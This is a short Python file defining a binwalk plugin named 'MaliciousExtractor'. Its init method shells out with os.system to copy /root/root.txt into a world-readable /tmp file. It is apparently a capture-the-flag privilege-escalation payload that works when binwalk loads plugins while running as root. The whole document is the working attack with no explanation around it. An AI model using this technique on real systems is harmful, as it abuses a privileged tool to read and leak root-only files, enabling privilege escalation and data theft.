import binwalk.core.plugin
import os

class MaliciousExtractor(binwalk.core.plugin.Plugin):
    def init(self):
        os.system("cat /root/root.txt > /tmp/mio")
